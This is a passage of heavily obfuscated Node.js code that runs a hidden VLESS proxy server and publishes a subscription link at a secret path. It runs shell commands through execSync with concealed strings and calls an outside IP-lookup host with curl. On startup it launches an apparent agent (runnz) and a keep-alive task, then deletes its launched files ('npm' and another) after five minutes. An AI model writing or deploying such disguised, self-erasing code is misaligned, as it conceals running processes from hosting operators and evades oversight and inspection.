_0x2b5b46=_0x3eb3c9;_0x9eeec6?(log(_0x2b5b46(0x130),_0x2b5b46(0x91)+_0x9eeec6[_0x2b5b46(0xa4)]),_0x1f8761(_0x9eeec6)):_0x3d7b9b();});});}[_0x26a83e(0x8b)](){const _0x5452a7=_0x26a83e;if(!this[_0x5452a7(0xf1)]||!this['responseHeader'])return;try{!this[_0x5452a7(0x14b)]&&(this['currentStreamRes'][_0x5452a7(0x153)](this[_0x5452a7(0xdb)]),this[_0x5452a7(0x14b)]=!![]),this['remote'][_0x5452a7(0x13b)](this[_0x5452a7(0xf1)]),this[_0x5452a7(0xcd)]['on'](_0x5452a7(0x13a),()=>{const _0x1d8966=_0x5452a7;!this['currentStreamRes'][_0x1d8966(0x8c)]&&this[_0x1d8966(0xf1)][_0x1d8966(0x13a)]();}),this[_0x5452a7(0xcd)]['on'](_0x5452a7(0x130),_0x19c903=>{const _0x5bf6d1=_0x5452a7;log(_0x5bf6d1(0x130),_0x5bf6d1(0x149)+_0x19c903[_0x5bf6d1(0xa4)]),!this[_0x5bf6d1(0xf1)][_0x5bf6d1(0x8c)]&&this[_0x5bf6d1(0xf1)][_0x5bf6d1(0x13a)]();});}catch(_0x14e652){log(_0x5452a7(0x130),_0x5452a7(0x129)+_0x14e652[_0x5452a7(0xa4)]),this[_0x5452a7(0x124)]();}}[_0x26a83e(0x124)](){const _0x34c66b=_0x26a83e;!this['cleaned']&&(this[_0x34c66b(0x11d)]=!![],log(_0x34c66b(0xd1),_0x34c66b(0xa3)+this['uuid']),this[_0x34c66b(0xcd)]&&(this['remote']['destroy'](),this[_0x34c66b(0xcd)]=null),this[_0x34c66b(0xfd)]=![],this[_0x34c66b(0x14b)]=![]);}}function _0x2e86(_0x36fdf3,_0x542474){const _0x10acef=_0x10ac();return _0x2e86=function(_0x2e8625,_0x5e58fd){_0x2e8625=_0x2e8625-0x82;let _0x1661a9=_0x10acef[_0x2e8625];return _0x1661a9;},_0x2e86(_0x36fdf3,_0x542474);}const metaInfo=execSync(_0x26a83e(0xc7),{'encoding':_0x26a83e(0xf2)}),ISP=metaInfo[_0x26a83e(0x100)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x26a83e(0x108),{'encoding':_0x26a83e(0xf2)})['trim']();}catch(_0x9872b2){try{IP='['+execSync('curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb',{'encoding':'utf-8'})[_0x26a83e(0x100)]()+']';}catch(_0x12f8ce){log(_0x26a83e(0x130),_0x26a83e(0xd2),_0x12f8ce['message']),IP='localhost';}}const server=http[_0x26a83e(0x106)]((_0x16d810,_0x488ac7)=>{const _0x399c66=_0x26a83e,_0x3cc8d1={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x399c66(0xb5),'Cache-Control':_0x399c66(0x150),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x16d810['url']==='/'){_0x488ac7['writeHead'](0xc8,{'Content-Type':_0x399c66(0xa5)}),_0x488ac7[_0x399c66(0x13a)](_0x399c66(0x111));return;}if(_0x16d810['url']==='/'+SUB_PATH){const _0x290ba0='vless://'+UUID+'@'+IP+':443?encryption=none&security=tls&sni='+IP+'&fp=chrome&allowInsecure=1&type=xhttp&host='+IP+_0x399c66(0x145)+SETTINGS['XPATH']+_0x399c66(0xa2)+NAME+'-'+ISP,_0x459a43=Buffer[_0x399c66(0xc4)](_0x290ba0)[_0x399c66(0x134)](_0x399c66(0xff));_0x488ac7['writeHead'](0xc8,{'Content-Type':_0x399c66(0xa5)}),_0x488ac7[_0x399c66(0x13a)](_0x459a43+'\x0a');return;}const _0x3c69b8=_0x16d810[_0x399c66(0x10f)][_0x399c66(0xc2)](new RegExp(XPATH+_0x399c66(0x113)));if(!_0x3c69b8){_0x488ac7[_0x399c66(0x12b)](0x194),_0x488ac7[_0x399c66(0x13a)]();return;}const _0x4f4636=_0x3c69b8[0x1],_0xea578c=_0x3c69b8[0x2]?parseInt(_0x3c69b8[0x2]):null;if(_0x16d810['method']==='GET'&&!_0xea578c){_0x3cc8d1[_0x399c66(0xd9)]=_0x399c66(0x12e),_0x3cc8d1[_0x399c66(0xf0)]=_0x399c66(0x82);let _0x1341e0=sessions[_0x399c66(0x137)](_0x4f4636);!_0x1341e0&&(_0x1341e0=new Session(_0x4f4636),sessions['set'](_0x4f4636,_0x1341e0),log(_0x399c66(0x159),'Created\x20new\x20session\x20for\x20GET:\x20'+_0x4f4636));_0x1341e0[_0x399c66(0x94)]=!![];!_0x1341e0[_0x399c66(0xfa)](_0x488ac7,_0x3cc8d1)&&(log('error',_0x399c66(0x133)+_0x4f4636),!_0x488ac7[_0x399c66(0xea)]&&(_0x488ac7[_0x399c66(0x12b)](0x1f4),_0x488ac7[_0x399c66(0x13a)]()),_0x1341e0[_0x399c66(0x124)](),sessions[_0x399c66(0x11a)](_0x4f4636));return;}if(_0x16d810[_0x399c66(0xab)]===_0x399c66(0x116)&&_0xea578c!==null){let _0x4099a3=sessions[_0x399c66(0x137)](_0x4f4636);!_0x4099a3&&(_0x4099a3=new Session(_0x4f4636),sessions[_0x399c66(0xb4)](_0x4f4636,_0x4099a3),log(_0x399c66(0x159),'Created\x20new\x20session\x20for\x20POST:\x20'+_0x4f4636),setTimeout(()=>{const _0x4343b7=_0x399c66,_0x85c624=sessions[_0x4343b7(0x137)](_0x4f4636);_0x85c624&&!_0x85c624[_0x4343b7(0x94)]&&(log(_0x4343b7(0x89),_0x4343b7(0x14e)+_0x4f4636+_0x4343b7(0xe9)),_0x85c624['cleanup'](),sessions[_0x4343b7(0x11a)](_0x4f4636));},SETTINGS[_0x399c66(0xd8)]));let _0x559ab5=[],_0x1b2004=0x0,_0x3dfee7=![];_0x16d810['on'](_0x399c66(0x13f),_0x399699=>{const _0xabbe51=_0x399c66;_0x1b2004+=_0x399699[_0xabbe51(0x93)];if(_0x1b2004>SETTINGS[_0xabbe51(0x120)]){!_0x3dfee7&&(_0x488ac7[_0xabbe51(0x12b)](0x19d),_0x488ac7['end'](),_0x3dfee7=!![]);return;}_0x559ab5['push'](_0x399699);}),_0x16d810['on'](_0x399c66(0x13a),async()=>{const _0x4ea125=_0x399c66;if(_0x3dfee7)return;try{const _0x20369d=Buffer[_0x4ea125(0xa6)](_0x559ab5);log('info','Processing\x20packet:\x20seq='+_0xea578c+',\x20size='+_0x20369d[_0x4ea125(0x93)]),await _0x4099a3['processPacket'](_0xea578c,_0x20369d),!_0x3dfee7&&(_0x488ac7[_0x4ea125(0x12b)](0xc8,_0x3cc8d1),_0x3dfee7=!![]),_0x488ac7[_0x4ea125(0x13a)]();}catch(_0x5031f0){log(_0x4ea125(0x130),'Failed\x20to\x20process\x20POST\x20request:\x20'+_0x5031f0['message']),_0x4099a3[_0x4ea125(0x124)](),sessions['delete'](_0x4f4636),!_0x3dfee7&&(_0x488ac7[_0x4ea125(0x12b)](0x1f4),_0x3dfee7=!![]),_0x488ac7[_0x4ea125(0x13a)]();}});return;}_0x488ac7[_0x399c66(0x12b)](0x194),_0x488ac7['end']();});server['on']('secureConnection',_0x1ff382=>{const _0x21b964=_0x26a83e;log(_0x21b964(0xd1),_0x21b964(0xf5)+(_0x1ff382[_0x21b964(0x118)]||_0x21b964(0x143)));});function generatePadding(_0x3191c9,_0xc2c05f){const _0x34a9f4=_0x26a83e,_0x11dd90=_0x3191c9+Math[_0x34a9f4(0xbb)](Math[_0x34a9f4(0x102)]()*(_0xc2c05f-_0x3191c9));return Buffer[_0x34a9f4(0xc4)](Array(_0x11dd90)[_0x34a9f4(0x8a)]('X')[_0x34a9f4(0x83)](''))[_0x34a9f4(0x134)](_0x34a9f4(0xff));}server[_0x26a83e(0x96)]=0x975e0,server[_0x26a83e(0xbd)]=0x98968,server['on']('error',_0xc372da=>{const _0x59ede7=_0x26a83e;log(_0x59ede7(0x130),_0x59ede7(0xa9)+_0xc372da[_0x59ede7(0xa4)]);});const delFiles=()=>{const _0x279d49=_0x26a83e;['npm',_0x279d49(0xb7)][_0x279d49(0x115)](_0x52d491=>fs[_0x279d49(0xed)](_0x52d491,()=>{}));};server[_0x26a83e(0x105)](PORT,()=>{const _0x3cec3f=_0x26a83e;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x3cec3f(0x136)](_0x3cec3f(0x126)+PORT),log(_0x3cec3f(0x159),_0x3cec3f(0x13c)),log(_0x3cec3f(0x159),_0x3cec3f(0xdd)+SETTINGS['LOG_LEVEL']),log(_0x3cec3f(0x159),_0x3cec3f(0x142)+SETTINGS[_0x3cec3f(0x11e)]),log(_0x3cec3f(0x159),'Max\x20POST\x20size:\x20'+SETTINGS['MAX_POST_SIZE']+'KB'),log(_0x3cec3f(0x159),'Max\x20buffer\x20size:\x20'+SETTINGS[_0x3cec3f(0x84)]+'KB'),log(_0x3cec3f(0x159),_0x3cec3f(0xe5)+SETTINGS[_0x3cec3f(0x12d)]+'bytes'),log(_0x3cec3f(0x159),'=================================');});
